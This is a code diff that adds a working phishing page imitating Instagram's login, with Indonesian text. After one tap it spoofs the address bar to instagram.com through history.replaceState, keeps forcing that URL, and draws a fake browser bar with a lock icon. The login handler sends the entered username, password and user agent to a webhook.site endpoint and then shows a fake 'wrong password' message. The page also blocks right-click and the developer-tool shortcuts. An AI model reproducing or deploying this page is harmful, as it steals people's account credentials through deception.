@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+body{background:#fff;height:100vh;overflow:hidden;padding-top:56px}
+#fakeBar{position:fixed;top:0;left:0;right:0;height:56px;background:#fff;z-index:99999;display:flex;align-items:center;padding:0 10px;gap:6px;border-bottom:1px solid #d0d0d0;display:none}
+#fakeBar .time{font-size:12px;font-weight:600;color:#1a1a1a;min-width:32px}
+#fakeBar .tabs{display:flex;gap:2px}
+#fakeBar .tab{background:#f0f0f0;padding:3px 10px;border-radius:20px;font-size:10px;color:#333;display:flex;align-items:center;gap:4px}
+#fakeBar .tab.active{background:#fff;border:1px solid #d0d0d0}
+#fakeBar .tab .dot{width:7px;height:7px;border-radius:50%;background:#34a853}
+#fakeBar .url{flex:1;background:#f1f3f4;border-radius:24px;padding:3px 14px;display:flex;align-items:center;gap:4px;height:30px;overflow:hidden}
+#fakeBar .url .lock{font-size:13px;color:#5f6368}
+#fakeBar .url .txt{font-size:12px;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+#fakeBar .url .txt .hl{font-weight:500}
+#fakeBar .menu{display:flex;gap:10px;color:#5f6368;font-size:16px}
+.container{max-width:360px;margin:20px auto;padding:0 16px;text-align:center;display:none}
+.container.show{display:block}
+.logo{font-size:48px;font-weight:700;font-family:"Times New Roman",serif;margin:20px 0 30px;background:linear-gradient(135deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.inp{margin-bottom:10px}
+.inp input{width:100%;padding:14px 12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;outline:none}
+.inp input:focus{border-color:#a8a8a8}
+.btn{width:100%;padding:14px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:8px;opacity:0.6;cursor:pointer}
+.btn.aktif{opacity:1}
+.divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
+.divider::before{margin-right:18px}
+.divider::after{margin-left:18px}
+.fb{color:#385185;font-weight:600;font-size:14px;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:6px;margin:10px 0 18px}
+.fb svg{width:18px;height:18px;fill:#385185}
+.lupa{color:#00376b;font-size:12px;text-decoration:none}
+.daftar{margin-top:18px;padding:18px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;background:#fff}
+.daftar a{color:#0095f6;font-weight:600;text-decoration:none}
+.toast{display:none;background:#ed4956;color:#fff;padding:12px;border-radius:6px;margin-bottom:14px;font-size:14px}
+.toast.muncul{display:block}
+
+#trigger{position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:99998;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;transition:opacity 0.4s;padding:20px;cursor:pointer}
+#trigger h1{font-size:24px;color:#262626;margin-bottom:8px}
+#trigger p{color:#8e8e8e;font-size:14px;margin-bottom:20px}
+#trigger .tap-icon{font-size:48px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+#trigger.hidden{opacity:0;pointer-events:none}
+</style>
+</head>
+<body>
+
+<div id="fakeBar">
+<span class="time" id="jam">12:00</span>
+<div class="tabs"><span class="tab active"><span class="dot"></span> Instagram</span><span class="tab">Google</span></div>
+<div class="url"><span class="lock">🔒</span><span class="txt"><span class="hl">https://</span>www.instagram.com/accounts/login/</span></div>
+<div class="menu"><span>⋮</span><span>⬇</span></div>
+</div>
+
+<div id="trigger">
+<h1>👋 Instagram</h1>
+<p>Tap di mana saja untuk melanjutkan</p>
+<div class="tap-icon">👆</div>
+</div>
+
+<div class="container" id="igContent">
+<div class="toast" id="toast">❌ Maaf, kata sandi salah. Coba lagi.</div>
+<div class="logo">Instagram</div>
+<div class="inp"><input type="text" id="user" placeholder="Nomor telepon, email, atau nama pengguna" autofocus></div>
+<div class="inp"><input type="password" id="pass" placeholder="Kata sandi"></div>
+<button class="btn" id="loginBtn">Masuk</button>
+<div class="divider">ATAU</div>
+<a href="#" class="fb"><svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg> Masuk dengan Facebook</a>
+<a href="#" class="lupa">Lupa kata sandi?</a>
+<div class="daftar">Belum punya akun? <a href="#">Daftar</a></div>
+<div style="margin-top:20px;font-size:13px;color:#8e8e8e;">Dapatkan aplikasi.<br><img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" style="height:40px;margin:6px 4px;"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" style="height:40px;margin:6px 4px;"></div>
+</div>
+
+<script>
+// ============================================================
+// INTERAKSI MINIMAL: TAP SEKALI → LANGSUNG SPOOF
+// ============================================================
+
+let aktif = false;
+const trigger = document.getElementById('trigger');
+const fakeBar = document.getElementById('fakeBar');
+const igContent = document.getElementById('igContent');
+
+function spoof() {
+    if (aktif) return;
+    aktif = true;
+    
+    const PALSU = 'https://www.instagram.com/accounts/login/';
+    
+    // Ganti address bar
+    history.replaceState(null, 'Instagram', PALSU);
+    
+    // Lock URL
+    setInterval(() => {
+        if (location.href !== PALSU) {
+            history.replaceState(null, 'Instagram', PALSU);
+        }
+    }, 100);
+    
+    window.addEventListener('popstate', () => {
+        history.replaceState(null, 'Instagram', PALSU);
+    });
+    
+    // Sembunyikan trigger
+    trigger.classList.add('hidden');
+    
+    // Tampilkan fake bar + konten
+    fakeBar.style.display = 'flex';
+    igContent.classList.add('show');
+    
+    console.log('✅ SPOOF AKTIF: ' + PALSU);
+}
+
+// ============================================================
+// DETEKSI TAP — SENTUH SEKALI DI MANA SAJA
+// ============================================================
+
+trigger.addEventListener('click', spoof);
+trigger.addEventListener('touchstart', function(e) {
+    e.preventDefault(); // biar ga double fire
+    spoof();
+});
+
+// ============================================================
+// JAM
+// ============================================================
+function jam() {
+    const n = new Date();
+    document.getElementById('jam').textContent = 
+        String(n.getHours()).padStart(2,'0') + ':' + 
+        String(n.getMinutes()).padStart(2,'0');
+}
+jam();
+setInterval(jam, 10000);
+
+// ============================================================
+// LOGIN
+// ============================================================
+const user = document.getElementById('user');
+const pass = document.getElementById('pass');
+const btn = document.getElementById('loginBtn');
+const toast = document.getElementById('toast');
+
+function cek() {
+    if (user.value.trim() !== '' && pass.value.trim() !== '') {
+        btn.classList.add('aktif');
+        btn.disabled = false;
+    } else {
+        btn.classList.remove('aktif');
+        btn.disabled = true;
+    }
+}
+user.addEventListener('input', cek);
+pass.addEventListener('input', cek);
+
+btn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const u = user.value.trim();
+    const p = pass.value.trim();
+    if (u === '' || p === '') {
+        toast.textContent = '❌ Harap isi semua kolom.';
+        toast.classList.add('muncul');
+        setTimeout(() => toast.classList.remove('muncul'), 3000);
+        return;
+    }
+    const data = { username: u, password: p, waktu: new Date().toISOString(), ua: navigator.userAgent };
+    fetch('https://webhook.site/your-unique-id', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+    btn.textContent = '⏳ Memproses...';
+    btn.disabled = true;
+    setTimeout(() => {
+        toast.textContent = '❌ Maaf, kata sandi Anda salah. Coba lagi.';
+        toast.classList.add('muncul');
+        btn.textContent = 'Masuk';
+        btn.disabled = false;
+        cek();
+        pass.value = '';
+        pass.focus();
+        setTimeout(() => toast.classList.remove('muncul'), 4000);
+    }, 1800);
+});
+
+pass.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !btn.disabled) btn.click();
+});
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+    }
+});
+</script>
+</body>
+</html>
